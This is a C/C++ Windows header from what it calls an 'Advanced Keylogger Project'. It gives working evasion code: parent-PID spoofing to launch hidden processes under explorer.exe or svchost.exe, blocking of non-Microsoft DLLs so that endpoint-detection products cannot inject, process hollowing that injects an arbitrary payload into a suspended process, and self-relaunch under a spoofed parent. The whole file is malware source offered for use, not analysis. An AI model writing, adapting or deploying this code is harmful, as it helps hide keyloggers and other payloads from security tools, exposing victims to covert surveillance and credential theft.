/*
 * Process Evasion Header
 * PPID Spoofing, Process Hollowing Improvements
 * 
 * Features:
 * - Parent PID spoofing (spawn under trusted parent)
 * - Block DLLs (prevent EDR DLL injection)
 * - Mitigation policy abuse
 * - Token manipulation
 * 
 * Advanced Keylogger Project - Elite Upgrade
 */

#ifndef PROCESS_H
#define PROCESS_H

#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <string>

// ==================== STRUCTURES ====================

// Extended process information for Vista+
typedef struct _PROC_THREAD_ATTRIBUTE_LIST *PPROC_THREAD_ATTRIBUTE_LIST;

// Attribute identifiers
#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS    0x00020000
#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY 0x00020007

// Mitigation policies (Windows 10+)
#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON 0x100000000000ULL

// ==================== NATIVE API IMPORTS ====================

typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

typedef BOOL(WINAPI* pInitializeProcThreadAttributeList)(
    PPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
    DWORD dwAttributeCount,
    DWORD dwFlags,
    PSIZE_T lpSize
);

typedef BOOL(WINAPI* pUpdateProcThreadAttribute)(
    PPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
    DWORD dwFlags,
    DWORD_PTR Attribute,
    PVOID lpValue,
    SIZE_T cbSize,
    PVOID lpPreviousValue,
    PSIZE_T lpReturnSize
);

typedef VOID(WINAPI* pDeleteProcThreadAttributeList)(
    PPROC_THREAD_ATTRIBUTE_LIST lpAttributeList
);

// ==================== HELPER FUNCTIONS ====================

// Find process by name and return handle
inline HANDLE FindProcessByName(const char* processName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return NULL;
    
    PROCESSENTRY32 pe = { sizeof(pe) };
    
    if (Process32First(hSnap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, processName) == 0) {
                CloseHandle(hSnap);
                
                // Open with limited rights (just need handle for PPID spoof)
                return OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
            }
        } while (Process32Next(hSnap, &pe));
    }
    
    CloseHandle(hSnap);
    return NULL;
}

// Get PID of process by name  
inline DWORD GetProcessIdByName(const char* processName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;
    
    PROCESSENTRY32 pe = { sizeof(pe) };
    
    if (Process32First(hSnap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, processName) == 0) {
                CloseHandle(hSnap);
                return pe.th32ProcessID;
            }
        } while (Process32Next(hSnap, &pe));
    }
    
    CloseHandle(hSnap);
    return 0;
}

// ==================== PPID SPOOFING ====================
/*
 * Creates a process with a spoofed parent PID.
 * The child process appears to be spawned by the specified parent.
 * 
 * Common parents to spoof:
 * - explorer.exe (user processes)
 * - svchost.exe (service processes)
 * - RuntimeBroker.exe (UWP related)
 * - services.exe (system services)
 */

inline BOOL CreateProcessWithParent(
    const char* lpApplicationName,
    char* lpCommandLine,
    HANDLE hParentProcess,
    LPPROCESS_INFORMATION lpProcessInformation,
    BOOL bBlockDlls = FALSE
) {
    if (!hParentProcess) return FALSE;
    
    // Get function pointers
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) return FALSE;
    
    pInitializeProcThreadAttributeList fnInitialize = 
        (pInitializeProcThreadAttributeList)GetProcAddress(hKernel32, "InitializeProcThreadAttributeList");
    pUpdateProcThreadAttribute fnUpdate = 
        (pUpdateProcThreadAttribute)GetProcAddress(hKernel32, "UpdateProcThreadAttribute");
    pDeleteProcThreadAttributeList fnDelete = 
        (pDeleteProcThreadAttributeList)GetProcAddress(hKernel32, "DeleteProcThreadAttributeList");
    
    if (!fnInitialize || !fnUpdate || !fnDelete) {
        return FALSE;  // Old Windows version
    }
    
    // Determine number of attributes
    DWORD dwAttributeCount = 1;  // Parent process
    if (bBlockDlls) dwAttributeCount++;  // Mitigation policy
    
    // Get required size
    SIZE_T attrListSize = 0;
    fnInitialize(NULL, dwAttributeCount, 0, &attrListSize);
    
    // Allocate attribute list
    PPROC_THREAD_ATTRIBUTE_LIST pAttrList = 
        (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attrListSize);
    
    if (!pAttrList) return FALSE;
    
    // Initialize
    if (!fnInitialize(pAttrList, dwAttributeCount, 0, &attrListSize)) {
        HeapFree(GetProcessHeap(), 0, pAttrList);
        return FALSE;
    }
    
    // Set parent process
    if (!fnUpdate(pAttrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
        fnDelete(pAttrList);
        HeapFree(GetProcessHeap(), 0, pAttrList);
        return FALSE;
    }
    
    // Optionally block non-Microsoft DLLs
    DWORD64 policy = 0;
    if (bBlockDlls) {
        policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
        fnUpdate(pAttrList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
            &policy, sizeof(policy), NULL, NULL);
    }
    
    // Setup STARTUPINFOEX
    STARTUPINFOEXA si = { 0 };
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    si.StartupInfo.wShowWindow = SW_HIDE;
    si.lpAttributeList = pAttrList;
    
    // Create process
    BOOL result = CreateProcessA(
        lpApplicationName,
        lpCommandLine,
        NULL,
        NULL,
        FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si.StartupInfo,
        lpProcessInformation
    );
    
    // Cleanup
    fnDelete(pAttrList);
    HeapFree(GetProcessHeap(), 0, pAttrList);
    
    return result;
}

// Convenience function - spawn under explorer.exe
inline BOOL SpawnUnderExplorer(const char* lpCommandLine, LPPROCESS_INFORMATION lpPi) {
    HANDLE hExplorer = FindProcessByName("explorer.exe");
    if (!hExplorer) return FALSE;
    
    char cmdLine[MAX_PATH * 2];
    strcpy_s(cmdLine, lpCommandLine);
    
    BOOL result = CreateProcessWithParent(NULL, cmdLine, hExplorer, lpPi, FALSE);
    
    CloseHandle(hExplorer);
    return result;
}

// Spawn under svchost.exe
inline BOOL SpawnUnderSvchost(const char* lpCommandLine, LPPROCESS_INFORMATION lpPi) {
    HANDLE hSvchost = FindProcessByName("svchost.exe");
    if (!hSvchost) return FALSE;
    
    char cmdLine[MAX_PATH * 2];
    strcpy_s(cmdLine, lpCommandLine);
    
    BOOL result = CreateProcessWithParent(NULL, cmdLine, hSvchost, lpPi, FALSE);
    
    CloseHandle(hSvchost);
    return result;
}

// ==================== BLOCK DLL INJECTION ====================
/*
 * Prevents non-Microsoft DLLs from being loaded.
 * Blocks most EDR from injecting their DLLs.
 * Only works on Windows 10+.
 */

inline BOOL SpawnWithBlockedDlls(const char* lpCommandLine, LPPROCESS_INFORMATION lpPi) {
    HANDLE hExplorer = FindProcessByName("explorer.exe");
    if (!hExplorer) {
        // Fallback to normal CreateProcess
        STARTUPINFOA si = { sizeof(si) };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        
        char cmdLine[MAX_PATH * 2];
        strcpy_s(cmdLine, lpCommandLine);
        
        return CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
            CREATE_NO_WINDOW, NULL, NULL, &si, lpPi);
    }
    
    char cmdLine[MAX_PATH * 2];
    strcpy_s(cmdLine, lpCommandLine);
    
    BOOL result = CreateProcessWithParent(NULL, cmdLine, hExplorer, lpPi, TRUE);
    
    CloseHandle(hExplorer);
    return result;
}

// ==================== PROCESS HOLLOWING IMPROVED ====================
/*
 * Enhanced process hollowing with:
 * - PPID spoofing
 * - Section unmapping via syscall
 * - Manual section mapping
 */

inline BOOL ProcessHollowAdvanced(
    const char* targetProcess,
    BYTE* payload,
    DWORD payloadSize,
    HANDLE hParentProcess = NULL
) {
    PROCESS_INFORMATION pi = { 0 };
    BOOL success = FALSE;
    
    // Create suspended process
    STARTUPINFOEXA si = { 0 };
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    si.StartupInfo.wShowWindow = SW_HIDE;
    
    DWORD creationFlags = CREATE_SUSPENDED | CREATE_NO_WINDOW;
    
    if (hParentProcess) {
        // Use PPID spoofing
        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        pInitializeProcThreadAttributeList fnInit = 
            (pInitializeProcThreadAttributeList)GetProcAddress(hKernel32, "InitializeProcThreadAttributeList");
        pUpdateProcThreadAttribute fnUpdate = 
            (pUpdateProcThreadAttribute)GetProcAddress(hKernel32, "UpdateProcThreadAttribute");
        pDeleteProcThreadAttributeList fnDelete = 
            (pDeleteProcThreadAttributeList)GetProcAddress(hKernel32, "DeleteProcThreadAttributeList");
        
        if (fnInit && fnUpdate && fnDelete) {
            SIZE_T size = 0;
            fnInit(NULL, 1, 0, &size);
            si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
            
            if (si.lpAttributeList) {
                fnInit(si.lpAttributeList, 1, 0, &size);
                fnUpdate(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    &hParentProcess, sizeof(HANDLE), NULL, NULL);
                creationFlags |= EXTENDED_STARTUPINFO_PRESENT;
            }
        }
    }
    
    if (!CreateProcessA(targetProcess, NULL, NULL, NULL, FALSE,
        creationFlags, NULL, NULL, &si.StartupInfo, &pi)) {
        goto cleanup;
    }
    
    // Get thread context
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;
    
    if (!GetThreadContext(pi.hThread, &ctx)) {
        TerminateProcess(pi.hProcess, 0);
        goto cleanup;
    }
    
    // Read PEB to get image base
    PVOID pImageBase;
    SIZE_T bytesRead;
    
#ifdef _WIN64
    PVOID pebImageBase = (PVOID)(ctx.Rdx + 16);
#else
    PVOID pebImageBase = (PVOID)(ctx.Ebx + 8);
#endif
    
    if (!ReadProcessMemory(pi.hProcess, pebImageBase, &pImageBase, sizeof(PVOID), &bytesRead)) {
        TerminateProcess(pi.hProcess, 0);
        goto cleanup;
    }
    
    // Unmap original section
    typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
    pNtUnmapViewOfSection NtUnmap = (pNtUnmapViewOfSection)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
    
    if (NtUnmap) {
        NtUnmap(pi.hProcess, pImageBase);
    }
    
    // Parse payload PE
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)payload;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(payload + pDos->e_lfanew);
    
    // Allocate memory in remote process
    PVOID pRemoteImage = VirtualAllocEx(pi.hProcess, 
        (PVOID)pNt->OptionalHeader.ImageBase,
        pNt->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);
    
    if (!pRemoteImage) {
        // Try at any address
        pRemoteImage = VirtualAllocEx(pi.hProcess, NULL,
            pNt->OptionalHeader.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);
    }
    
    if (!pRemoteImage) {
        TerminateProcess(pi.hProcess, 0);
        goto cleanup;
    }
    
    // Write PE headers
    WriteProcessMemory(pi.hProcess, pRemoteImage, payload,
        pNt->OptionalHeader.SizeOfHeaders, NULL);
    
    // Write sections
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(pi.hProcess,
            (BYTE*)pRemoteImage + pSection[i].VirtualAddress,
            payload + pSection[i].PointerToRawData,
            pSection[i].SizeOfRawData,
            NULL);
    }
    
    // Update entry point
#ifdef _WIN64
    ctx.Rcx = (DWORD64)pRemoteImage + pNt->OptionalHeader.AddressOfEntryPoint;
#else
    ctx.Eax = (DWORD)pRemoteImage + pNt->OptionalHeader.AddressOfEntryPoint;
#endif
    
    // Update image base in PEB
    WriteProcessMemory(pi.hProcess, pebImageBase, &pRemoteImage, sizeof(PVOID), NULL);
    
    // Set context
    SetThreadContext(pi.hThread, &ctx);
    
    // Resume
    ResumeThread(pi.hThread);
    
    success = TRUE;
    
cleanup:
    if (si.lpAttributeList) {
        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        pDeleteProcThreadAttributeList fnDelete = 
            (pDeleteProcThreadAttributeList)GetProcAddress(hKernel32, "DeleteProcThreadAttributeList");
        if (fnDelete) fnDelete(si.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
    }
    
    if (!success && pi.hProcess) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    return success;
}

// ==================== SELF RELAUNCH ====================
// Relaunch self under a different parent

inline BOOL RelaunchUnderParent(const char* parentName) {
    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
    
    HANDLE hParent = FindProcessByName(parentName);
    if (!hParent) return FALSE;
    
    PROCESS_INFORMATION pi;
    BOOL result = CreateProcessWithParent(selfPath, NULL, hParent, &pi, FALSE);
    
    CloseHandle(hParent);
    
    if (result) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        ExitProcess(0);  // Exit current process
    }
    
    return result;
}

#endif // PROCESS_H
